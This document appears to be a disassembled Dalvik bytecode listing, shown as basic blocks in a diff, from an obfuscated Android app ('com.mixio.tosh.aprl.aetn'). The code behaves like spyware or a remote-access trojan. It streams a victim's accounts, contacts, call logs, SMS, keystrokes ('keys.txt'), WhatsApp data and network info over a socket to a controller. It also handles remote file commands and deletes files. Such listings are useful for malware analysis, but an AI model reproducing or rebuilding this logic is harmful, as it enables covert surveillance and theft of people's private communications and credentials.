+run-BB@0x54a : [ run-BB@0x55e run-BB@0x5a6 ]
+	325     (0000054a) invoke-virtual       v7, v3, v8, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/io/DataInputStream; Ljava/lang/String;)Z
+	326     (00000550) move-result          v2
+	327     (00000552) const-string         v5, 'File:'
+	328     (00000556) const-string         v4, 'Endf'
+	329     (0000055a) if-eqz               v2, +26
+	54a:551
+	(Ljava/lang/Exception; -> f7c run-BB@0xf7c)
+
+run-BB@0x55e : [ run-BB@0x56e run-BB@0x572 ]
+	330     (0000055e) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	331     (00000562) invoke-virtual       v2, v4, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I
+	332     (00000568) move-result          v2
+	333     (0000056a) if-nez               v2, +4
+	55e:587
+	(Ljava/lang/Exception; -> 2be run-BB@0x2be)
+
+run-BB@0x56e : [ run-BB@0x584 ]
+	334     (0000056e) const/4              v2, 0
+	335     (00000570) goto                 +a
+	55e:587
+	(Ljava/lang/Exception; -> 2be run-BB@0x2be)
+
+run-BB@0x572 : [ run-BB@0x582 run-BB@0x56e ]
+	336     (00000572) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	337     (00000576) invoke-virtual       v2, v5, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I
+	338     (0000057c) move-result          v2
+	339     (0000057e) if-nez               v2, -8
+	55e:587
+	(Ljava/lang/Exception; -> 2be run-BB@0x2be)
+
+run-BB@0x582 : [ run-BB@0x5ac ]
+	340     (00000582) goto                 +15
+	55e:587
+	(Ljava/lang/Exception; -> 2be run-BB@0x2be)
+
+run-BB@0x584 : [ run-BB@0x5ac ]
+	341     (00000584) iput-boolean         v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->f Z
+	342     (00000588) goto                 +12
+
+run-BB@0x58a : [ run-BB@0xfb4 ]
+	343     (0000058a) move-object/from16   v18, v8
+	344     (0000058e) move-object/from16   v24, v9
+	345     (00000592) move-object/from16   v20, v12
+	346     (00000596) move-object/from16   v25, v15
+	347     (0000059a) move-object/from16   v19, v21
+	348     (0000059e) move-object/from16   v21, v11
+	349     (000005a2) goto/16              +509
+
+run-BB@0x5a6 : [ run-BB@0x5a8 ]
+	350     (000005a6) const/4              v2, 0
+
+run-BB@0x5a8 : [ run-BB@0x5ac ]
+	351     (000005a8) iput-boolean         v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->f Z
+	5a8:5c5
+	(Ljava/lang/Exception; -> f7c run-BB@0xf7c)
+
+run-BB@0x5ac : [ run-BB@0x5b6 run-BB@0xf4c ]
+	352     (000005ac) iget-boolean         v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->f Z
+	353     (000005b0) const/4              v6, 1
+	354     (000005b2) if-eq                v2, v6, +4cd
+	5a8:5c5
+	(Ljava/lang/Exception; -> f7c run-BB@0xf7c)
+
+run-BB@0x5b6 : [ run-BB@0x5fc ]
+	355     (000005b6) const-string         v2, 'AC'
+	356     (000005ba) const-string         v19, 'accounts.txt'
+	357     (000005be) sget-object          v6, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	358     (000005c2) iget-object          v6, v6, Lb/b/a/a/g/a;->f Lb/b/a/a/g/b;
+	359     (000005c6) move-object/from16   v27, v1
+	360     (000005ca) move-object/from16   v1, v31
+	361     (000005ce) const/16             v24, 0
+	362     (000005d2) move-object/from16   v28, v3
+	363     (000005d6) move-object/from16   v3, v19
+	364     (000005da) move-object/from16   v25, v15
+	365     (000005de) move-object/from16   v19, v21
+	366     (000005e2) const/16             v15, 512
+	367     (000005e6) move-object/from16   v21, v11
+	368     (000005ea) move-object          v11, v4
+	369     (000005ec) move-object/from16   v4, v28
+	370     (000005f0) move-object          v15, v5
+	371     (000005f2) move-object/from16   v20, v12
+	372     (000005f6) const/4              v12, 1
+	373     (000005f8) move-object/from16   v5, v27
+
+run-BB@0x5fc : [ run-BB@0x780 run-BB@0x7bc ]
+	374     (000005fc) invoke-virtual/range v1 ... v6, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Ljava/io/DataInputStream; Ljava/io/DataOutputStream; Lb/b/a/a/g/b;)V
+	375     (00000602) const-string         v2, 'NE'
+	376     (00000606) const-string         v3, 'netinfo.txt'
+	377     (0000060a) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	378     (0000060e) iget-object          v6, v1, Lb/b/a/a/g/a;->g Lb/b/a/a/g/b;
+	379     (00000612) move-object/from16   v1, v31
+	380     (00000616) move-object/from16   v4, v28
+	381     (0000061a) move-object/from16   v5, v27
+	382     (0000061e) invoke-virtual/range v1 ... v6, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Ljava/io/DataInputStream; Ljava/io/DataOutputStream; Lb/b/a/a/g/b;)V
+	383     (00000624) const-string         v2, 'CT'
+	384     (00000628) const-string         v3, 'contacts.txt'
+	385     (0000062c) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	386     (00000630) iget-object          v6, v1, Lb/b/a/a/g/a;->b Lb/b/a/a/g/b;
+	387     (00000634) move-object/from16   v1, v31
+	388     (00000638) move-object/from16   v4, v28
+	389     (0000063c) move-object/from16   v5, v27
+	390     (00000640) invoke-virtual/range v1 ... v6, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Ljava/io/DataInputStream; Ljava/io/DataOutputStream; Lb/b/a/a/g/b;)V
+	391     (00000646) const-string         v2, 'Call'
+	392     (0000064a) const-string         v3, 'CallLogs.txt'
+	393     (0000064e) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	394     (00000652) iget-object          v6, v1, Lb/b/a/a/g/a;->a Lb/b/a/a/g/b;
+	395     (00000656) move-object/from16   v1, v31
+	396     (0000065a) move-object/from16   v4, v28
+	397     (0000065e) move-object/from16   v5, v27
+	398     (00000662) invoke-virtual/range v1 ... v6, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Ljava/io/DataInputStream; Ljava/io/DataOutputStream; Lb/b/a/a/g/b;)V
+	399     (00000668) const-string         v2, 'SMS'
+	400     (0000066c) const-string         v3, 'sms.txt'
+	401     (00000670) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	402     (00000674) iget-object          v6, v1, Lb/b/a/a/g/a;->c Lb/b/a/a/g/b;
+	403     (00000678) move-object/from16   v1, v31
+	404     (0000067c) move-object/from16   v4, v28
+	405     (00000680) move-object/from16   v5, v27
+	406     (00000684) invoke-virtual/range v1 ... v6, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Ljava/io/DataInputStream; Ljava/io/DataOutputStream; Lb/b/a/a/g/b;)V
+	407     (0000068a) const-string         v2, 'Tree'
+	408     (0000068e) const-string         v3, 'Tree.txt'
+	409     (00000692) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	410     (00000696) iget-object          v6, v1, Lb/b/a/a/g/a;->e Lb/b/a/a/g/b;
+	411     (0000069a) move-object/from16   v1, v31
+	412     (0000069e) move-object/from16   v4, v28
+	413     (000006a2) move-object/from16   v5, v27
+	414     (000006a6) invoke-virtual/range v1 ... v6, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Ljava/io/DataInputStream; Ljava/io/DataOutputStream; Lb/b/a/a/g/b;)V
+	415     (000006ac) const-string         v2, 'GP'
+	416     (000006b0) const-string         v3, 'GP.txt'
+	417     (000006b4) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	418     (000006b8) iget-object          v6, v1, Lb/b/a/a/g/a;->k Lb/b/a/a/g/b;
+	419     (000006bc) move-object/from16   v1, v31
+	420     (000006c0) move-object/from16   v4, v28
+	421     (000006c4) move-object/from16   v5, v27
+	422     (000006c8) invoke-virtual/range v1 ... v6, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Ljava/io/DataInputStream; Ljava/io/DataOutputStream; Lb/b/a/a/g/b;)V
+	423     (000006ce) const-string         v2, 'Key'
+	424     (000006d2) const-string         v3, 'keys.txt'
+	425     (000006d6) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	426     (000006da) iget-object          v6, v1, Lb/b/a/a/g/a;->d Lb/b/a/a/g/b;
+	427     (000006de) move-object/from16   v1, v31
+	428     (000006e2) move-object/from16   v4, v28
+	429     (000006e6) move-object/from16   v5, v27
+	430     (000006ea) invoke-virtual/range v1 ... v6, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Ljava/io/DataInputStream; Ljava/io/DataOutputStream; Lb/b/a/a/g/b;)V
+	431     (000006f0) const-string         v2, 'Live'
+	432     (000006f4) const-string         v3, 'Live.txt'
+	433     (000006f8) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	434     (000006fc) iget-object          v6, v1, Lb/b/a/a/g/a;->h Lb/b/a/a/g/b;
+	435     (00000700) move-object/from16   v1, v31
+	436     (00000704) move-object/from16   v4, v28
+	437     (00000708) move-object/from16   v5, v27
+	438     (0000070c) invoke-virtual/range v1 ... v6, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Ljava/io/DataInputStream; Ljava/io/DataOutputStream; Lb/b/a/a/g/b;)V
+	439     (00000712) const-string         v2, 'PK'
+	440     (00000716) const-string         v3, 'pkinfo.txt'
+	441     (0000071a) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	442     (0000071e) iget-object          v6, v1, Lb/b/a/a/g/a;->l Lb/b/a/a/g/b;
+	443     (00000722) move-object/from16   v1, v31
+	444     (00000726) move-object/from16   v4, v28
+	445     (0000072a) move-object/from16   v5, v27
+	446     (0000072e) invoke-virtual/range v1 ... v6, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Ljava/io/DataInputStream; Ljava/io/DataOutputStream; Lb/b/a/a/g/b;)V
+	447     (00000734) const-string         v2, 'CE'
+	448     (00000738) const-string         v3, 'ce.txt'
+	449     (0000073c) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	450     (00000740) iget-object          v6, v1, Lb/b/a/a/g/a;->m Lb/b/a/a/g/b;
+	451     (00000744) move-object/from16   v1, v31
+	452     (00000748) move-object/from16   v4, v28
+	453     (0000074c) move-object/from16   v5, v27
+	454     (00000750) invoke-virtual/range v1 ... v6, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Ljava/io/DataInputStream; Ljava/io/DataOutputStream; Lb/b/a/a/g/b;)V
+	455     (00000756) const-string         v2, 'BW'
+	456     (0000075a) const-string         v3, 'bw.txt'
+	457     (0000075e) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	458     (00000762) iget-object          v6, v1, Lb/b/a/a/g/a;->n Lb/b/a/a/g/b;
+	459     (00000766) move-object/from16   v1, v31
+	460     (0000076a) move-object/from16   v4, v28
+	461     (0000076e) move-object/from16   v5, v27
+	462     (00000772) invoke-virtual/range v1 ... v6, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Ljava/io/DataInputStream; Ljava/io/DataOutputStream; Lb/b/a/a/g/b;)V
+	463     (00000778) sget-boolean         v1, Lcom/mixio/tosh/aprl/aetn/ate;->r Z
+	464     (0000077c) if-ne                v1, v12, +20
+	5fc:77b
+	(Ljava/lang/Exception; -> f3e run-BB@0xf3e)
+
+run-BB@0x780 : [ run-BB@0x788 run-BB@0x7bc ]
+	465     (00000780) sget-boolean         v1, Lcom/mixio/tosh/aprl/aetn/ate;->q Z
+	466     (00000784) if-nez               v1, +1c
+	780:7a9
+	(Ljava/lang/Exception; -> 7ac run-BB@0x7ac)
+
+run-BB@0x788 : [ run-BB@0x7bc ]
+	467     (00000788) const-string         v2, 'Wapp'
+	468     (0000078c) const-string         v3, 'WappHolder.txt'
+	469     (00000790) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	470     (00000794) iget-object          v6, v1, Lb/b/a/a/g/a;->o Lb/b/a/a/g/b;
+	471     (00000798) move-object/from16   v1, v31
+	472     (0000079c) move-object/from16   v4, v28
+	473     (000007a0) move-object/from16   v5, v27
+	474     (000007a4) invoke-virtual/range v1 ... v6, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Ljava/io/DataInputStream; Ljava/io/DataOutputStream; Lb/b/a/a/g/b;)V
+	475     (000007aa) goto                 +9
+
+run-BB@0x7ac : [ run-BB@0xfb4 ]
+	476     (000007ac) move-exception       v0
+	477     (000007ae) move-object          v1, v0
+	478     (000007b0) move-object/from16   v18, v8
+	479     (000007b4) move-object/from16   v24, v9
+	480     (000007b8) goto/16              +3fe
+
+run-BB@0x7bc : [ run-BB@0x7f0 run-BB@0xf34 ]
+	481     (000007bc) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->p Lcom/mixio/tosh/aprl/aetn/ate;
+	482     (000007c0) invoke-static        v1, Lcom/mixio/tosh/aprl/aetn/ate;->c(Lcom/mixio/tosh/aprl/aetn/ate;)V
+	483     (000007c6) const-string         v1, 'End'
+	484     (000007ca) invoke-virtual       v1, Ljava/lang/String;->getBytes()[B
+	485     (000007d0) move-result-object   v1
+	486     (000007d2) move-object/from16   v2, v27
+	487     (000007d6) invoke-virtual       v2, v1, Ljava/io/DataOutputStream;->write([B)V
+	488     (000007dc) const-string         v1, 'Exiting'
+	489     (000007e0) move-object/from16   v3, v28
+	490     (000007e4) invoke-virtual       v7, v3, v1, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/io/DataInputStream; Ljava/lang/String;)Z
+	491     (000007ea) move-result          v1
+	492     (000007ec) if-eqz               v1, +3a4
+	7bc:815
+	(Ljava/lang/Exception; -> f3e run-BB@0xf3e)
+
+run-BB@0x7f0 : [ run-BB@0x804 run-BB@0xf34 ]
+	493     (000007f0) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	494     (000007f4) const-string         v4, 'End Done'
+	495     (000007f8) invoke-virtual       v1, v4, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+	496     (000007fe) move-result          v1
+	497     (00000800) if-eqz               v1, +39a
+	7bc:815
+	(Ljava/lang/Exception; -> f3e run-BB@0xf3e)
+
+run-BB@0x804 : [ run-BB@0x81a run-BB@0x864 ]
+	498     (00000804) const/4              v1, -1
+	499     (00000806) iput                 v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->c I
+	500     (0000080a) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	501     (0000080e) iget-object          v1, v1, Lb/b/a/a/g/a;->j Lb/b/a/a/g/b;
+	502     (00000812) iget-boolean         v1, v1, Lb/b/a/a/g/b;->c Z
+	503     (00000816) if-ne                v1, v12, +27
+
+run-BB@0x81a : [ run-BB@0x82c run-BB@0x840 ]
+	504     (0000081a) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	505     (0000081e) iget-object          v1, v1, Lb/b/a/a/g/a;->j Lb/b/a/a/g/b;
+	506     (00000822) iget-boolean         v1, v1, Lb/b/a/a/g/b;->a Z
+	507     (00000826) const/4              v4, -2
+	508     (00000828) if-ne                v1, v12, +c
+	81a:863
+	(Ljava/lang/Exception; -> 7ac run-BB@0x7ac)
+
+run-BB@0x82c : [ run-BB@0x83c run-BB@0x840 ]
+	509     (0000082c) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->b Landroid/content/Context;
+	510     (00000830) invoke-static        v1, Lcom/mixio/tosh/aprl/aetn/ate;->a(Landroid/content/Context;)I
+	511     (00000836) move-result          v1
+	512     (00000838) if-ne                v1, v12, +4
+	81a:863
+	(Ljava/lang/Exception; -> 7ac run-BB@0x7ac)
+
+run-BB@0x83c : [ run-BB@0x840 ]
+	513     (0000083c) iput                 v4, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->c I
+	81a:863
+	(Ljava/lang/Exception; -> 7ac run-BB@0x7ac)
+
+run-BB@0x840 : [ run-BB@0x850 run-BB@0x864 ]
+	514     (00000840) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	515     (00000844) iget-object          v1, v1, Lb/b/a/a/g/a;->j Lb/b/a/a/g/b;
+	516     (00000848) iget-boolean         v1, v1, Lb/b/a/a/g/b;->a Z
+	517     (0000084c) if-ne                v1, v12, +c
+	81a:863
+	(Ljava/lang/Exception; -> 7ac run-BB@0x7ac)
+
+run-BB@0x850 : [ run-BB@0x860 run-BB@0x864 ]
+	518     (00000850) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->b Landroid/content/Context;
+	519     (00000854) invoke-static        v1, Lcom/mixio/tosh/aprl/aetn/ate;->a(Landroid/content/Context;)I
+	520     (0000085a) move-result          v1
+	521     (0000085c) if-nez               v1, +4
+	81a:863
+	(Ljava/lang/Exception; -> 7ac run-BB@0x7ac)
+
+run-BB@0x860 : [ run-BB@0x864 ]
+	522     (00000860) iput                 v4, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->c I
+	81a:863
+	(Ljava/lang/Exception; -> 7ac run-BB@0x7ac)
+
+run-BB@0x864 : [ run-BB@0x898 ]
+	523     (00000864) iget                 v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->c I
+	524     (00000868) invoke-static        v1, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
+	525     (0000086e) move-result-object   v1
+	526     (00000870) iput-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	527     (00000874) const/4              v1, 0
+	528     (00000876) iput-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->d [B
+	529     (0000087a) iget-object          v4, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	530     (0000087e) invoke-virtual       v4, Ljava/lang/String;->getBytes()[B
+	531     (00000884) move-result-object   v4
+	532     (00000886) iput-object          v4, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->d [B
+	533     (0000088a) iget-object          v4, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	534     (0000088e) iget-object          v4, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->d [B
+	535     (00000892) invoke-virtual       v2, v4, Ljava/io/DataOutputStream;->write([B)V
+	864:8af
+	(Ljava/lang/Exception; -> f3e run-BB@0xf3e)
+
+run-BB@0x898 : [ run-BB@0x8a4 run-BB@0xef8 ]
+	536     (00000898) invoke-virtual       v7, v3, v8, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/io/DataInputStream; Ljava/lang/String;)Z
+	537     (0000089e) move-result          v4
+	538     (000008a0) if-eqz               v4, +32c
+	864:8af
+	(Ljava/lang/Exception; -> f3e run-BB@0xf3e)
+
+run-BB@0x8a4 : [ run-BB@0x8b4 run-BB@0x8d2 ]
+	539     (000008a4) iget-object          v4, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	540     (000008a8) invoke-virtual       v4, v11, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I
+	541     (000008ae) move-result          v4
+	542     (000008b0) if-nez               v4, +11
+
+run-BB@0x8b4 : [ run-BB@0x8b6 ]
+	543     (000008b4) const/4              v4, 0
+
+run-BB@0x8b6 : [ run-BB@0xf10 ]
+	544     (000008b6) iput-boolean         v4, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->f Z
+	545     (000008ba) move-object          v4, v1
+	546     (000008bc) move-object/from16   v18, v8
+	547     (000008c0) move-object/from16   v24, v9
+	548     (000008c4) move-object/from16   v29, v11
+	549     (000008c8) const/16             v6, 512
+	550     (000008cc) const/4              v9, -1
+	551     (000008ce) goto/16              +321
+	8b6:8b9
+	(Ljava/lang/Exception; -> 7ac run-BB@0x7ac)
+
+run-BB@0x8d2 : [ run-BB@0x8d4 ]
+	552     (000008d2) const/4              v4, 0
+
+run-BB@0x8d4 : [ run-BB@0x8e4 run-BB@0xef8 ]
+	553     (000008d4) iget-object          v5, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	554     (000008d8) invoke-virtual       v5, v15, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+	555     (000008de) move-result          v5
+	556     (000008e0) if-eqz               v5, +30c
+	8d4:8df
+	(Ljava/lang/Exception; -> f3e run-BB@0xf3e)
+
+run-BB@0x8e4 : [ run-BB@0x8f4 run-BB@0x9d6 ]
+	557     (000008e4) iget-object          v5, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	558     (000008e8) array-length         v5, v5
+	559     (000008ea) const-string         v6, 'Temp/'
+	560     (000008ee) const/4              v1, 4
+	561     (000008f0) if-ne                v5, v1, +73
+	8e4:8e9
+	(Ljava/net/SocketException; -> eb4 run-BB@0xeb4)
+	(Ljava/lang/Exception; -> e30 run-BB@0xe30)
+
+run-BB@0x8f4 : [ run-BB@0x910 ]
+	562     (000008f4) new-instance         v5, Ljava/io/File;
+	563     (000008f8) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->c Ljava/io/File;
+	564     (000008fc) new-instance         v4, Ljava/lang/StringBuilder;
+	565     (00000900) invoke-direct        v4, Ljava/lang/StringBuilder;-><init>()V
+	566     (00000906) invoke-virtual       v4, v6, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	567     (0000090c) move-object/from16   v18, v8
+	8f4:90b
+	(Ljava/net/SocketException; -> 9c6 run-BB@0x9c6)
+	(Ljava/lang/Exception; -> 9b2 run-BB@0x9b2)
+
+run-BB@0x910 : [ run-BB@0x940 run-BB@0x9da ]
+	568     (00000910) iget-object          v8, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	569     (00000914) aget-object          v8, v8, v12
+	570     (00000918) invoke-virtual       v8, Ljava/lang/String;->trim()Ljava/lang/String;
+	571     (0000091e) move-result-object   v8
+	572     (00000920) invoke-virtual       v4, v8, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	573     (00000926) invoke-virtual       v4, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	574     (0000092c) move-result-object   v4
+	575     (0000092e) invoke-direct        v5, v1, v4, Ljava/io/File;-><init>(Ljava/io/File; Ljava/lang/String;)V
+	576     (00000934) invoke-virtual       v5, Ljava/io/File;->exists()Z
+	577     (0000093a) move-result          v1
+	578     (0000093c) if-eqz               v1, +4f
+	910:9a7
+	(Ljava/net/SocketException; -> 9ae run-BB@0x9ae)
+	(Ljava/lang/Exception; -> 9aa run-BB@0x9aa)
+
+run-BB@0x940 : [ run-BB@0x94c run-BB@0x9da ]
+	579     (00000940) invoke-virtual       v5, Ljava/io/File;->isDirectory()Z
+	580     (00000946) move-result          v1
+	581     (00000948) if-eqz               v1, +49
+	910:9a7
+	(Ljava/net/SocketException; -> 9ae run-BB@0x9ae)
+	(Ljava/lang/Exception; -> 9aa run-BB@0x9aa)
+
+run-BB@0x94c : [ run-BB@0x97c run-BB@0x97e ]
+	582     (0000094c) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->e Landroid/content/SharedPreferences;
+	583     (00000950) const-string         v4, 'filname'
+	584     (00000954) const-string         v8, '%3'
+	585     (00000958) invoke-interface     v1, v4, v8, Landroid/content/SharedPreferences;->getString(Ljava/lang/String; Ljava/lang/String;)Ljava/lang/String;
+	586     (0000095e) move-result-object   v1
+	587     (00000960) iget-object          v4, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	588     (00000964) aget-object          v4, v4, v12
+	589     (00000968) invoke-virtual       v4, Ljava/lang/String;->trim()Ljava/lang/String;
+	590     (0000096e) move-result-object   v4
+	591     (00000970) invoke-virtual       v1, v4, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I
+	592     (00000976) move-result          v1
+	593     (00000978) if-nez               v1, +3
+	910:9a7
+	(Ljava/net/SocketException; -> 9ae run-BB@0x9ae)
+	(Ljava/lang/Exception; -> 9aa run-BB@0x9aa)
+
+run-BB@0x97c : [ run-BB@0x9da ]
+	594     (0000097c) goto                 +2f
+	910:9a7
+	(Ljava/net/SocketException; -> 9ae run-BB@0x9ae)
+	(Ljava/lang/Exception; -> 9aa run-BB@0x9aa)
+
+run-BB@0x97e : [ run-BB@0x9a0 run-BB@0x9a2 ]
+	595     (0000097e) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	596     (00000982) const/4              v4, 0
+	597     (00000984) aget-object          v1, v1, v4
+	598     (00000988) invoke-virtual       v1, Ljava/lang/String;->trim()Ljava/lang/String;
+	599     (0000098e) move-result-object   v1
+	600     (00000990) const-string         v4, 'pFile'
+	601     (00000994) invoke-virtual       v1, v4, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+	602     (0000099a) move-result          v1
+	603     (0000099c) if-eqz               v1, +3
+	910:9a7
+	(Ljava/net/SocketException; -> 9ae run-BB@0x9ae)
+	(Ljava/lang/Exception; -> 9aa run-BB@0x9aa)
+
+run-BB@0x9a0 : [ run-BB@0x9da ]
+	604     (000009a0) goto                 +1d
+	910:9a7
+	(Ljava/net/SocketException; -> 9ae run-BB@0x9ae)
+	(Ljava/lang/Exception; -> 9aa run-BB@0x9aa)
+
+run-BB@0x9a2 : [ run-BB@0x9da ]
+	605     (000009a2) invoke-virtual       v5, Ljava/io/File;->delete()Z
+	606     (000009a8) goto                 +19
+
+run-BB@0x9aa : [ run-BB@0x9b8 ]
+	607     (000009aa) move-exception       v0
+	608     (000009ac) goto                 +6
+
+run-BB@0x9ae : [ run-BB@0x9cc ]
+	609     (000009ae) move-exception       v0
+	610     (000009b0) goto                 +e
+
+run-BB@0x9b2 : [ run-BB@0x9b8 ]
+	611     (000009b2) move-exception       v0
+	612     (000009b4) move-object/from16   v18, v8
+
+run-BB@0x9b8 : [ run-BB@0x9be ]
+	613     (000009b8) move-object          v1, v0
+	614     (000009ba) move-object/from16   v24, v9
+
+run-BB@0x9be : [ run-BB@0xc6e ]
+	615     (000009be) move-object/from16   v29, v11
+	616     (000009c2) goto/16              +156
+
+run-BB@0x9c6 : [ run-BB@0x9cc ]
+	617     (000009c6) move-exception       v0
+	618     (000009c8) move-object/from16   v18, v8
+
+run-BB@0x9cc : [ run-BB@0xec0 ]
+	619     (000009cc) move-object          v1, v0
+	620     (000009ce) move-object/from16   v24, v9
+	621     (000009d2) goto/16              +277
+
+run-BB@0x9d6 : [ run-BB@0x9da ]
+	622     (000009d6) move-object/from16   v18, v8
+
+run-BB@0x9da : [ run-BB@0x9f8 run-BB@0xa06 ]
+	623     (000009da) new-instance         v1, Ljava/io/File;
+	624     (000009de) sget-object          v4, Lcom/mixio/tosh/aprl/aetn/ate;->c Ljava/io/File;
+	625     (000009e2) const-string         v5, 'Temp'
+	626     (000009e6) invoke-direct        v1, v4, v5, Ljava/io/File;-><init>(Ljava/io/File; Ljava/lang/String;)V
+	627     (000009ec) invoke-virtual       v1, Ljava/io/File;->exists()Z
+	628     (000009f2) move-result          v4
+	629     (000009f4) if-eqz               v4, +9
+	9da:9f3
+	(Ljava/net/SocketException; -> e2c run-BB@0xe2c)
+	(Ljava/lang/Exception; -> e28 run-BB@0xe28)
+
+run-BB@0x9f8 : [ run-BB@0xa04 run-BB@0xa06 ]
+	630     (000009f8) invoke-virtual       v1, Ljava/io/File;->isDirectory()Z
+	631     (000009fe) move-result          v4
+	632     (00000a00) if-eqz               v4, +3
+	9f8:9ff
+	(Ljava/net/SocketException; -> 9ae run-BB@0x9ae)
+	(Ljava/lang/Exception; -> 9aa run-BB@0x9aa)
+
+run-BB@0xa04 : [ run-BB@0xa0c ]
+	633     (00000a04) goto                 +4
+
+run-BB@0xa06 : [ run-BB@0xa0c ]
+	634     (00000a06) invoke-virtual       v1, Ljava/io/File;->mkdir()Z
+	a06:a13
+	(Ljava/net/SocketException; -> e2c run-BB@0xe2c)
+	(Ljava/lang/Exception; -> e28 run-BB@0xe28)
+
+run-BB@0xa0c : [ run-BB@0xa1c run-BB@0xc78 ]
+	635     (00000a0c) invoke-virtual       v1, Ljava/io/File;->exists()Z
+	636     (00000a12) move-result          v4
+	637     (00000a14) const-string         v5, 'OK:'
+	638     (00000a18) if-eqz               v4, +130
+
+run-BB@0xa1c : [ run-BB@0xa28 run-BB@0xc78 ]
+	639     (00000a1c) invoke-virtual       v1, Ljava/io/File;->isDirectory()Z
+	640     (00000a22) move-result          v1
+	641     (00000a24) if-eqz               v1, +12a
+	a1c:a6b
+	(Ljava/net/SocketException; -> e2c run-BB@0xe2c)
+	(Ljava/lang/Exception; -> c62 run-BB@0xc62)
+
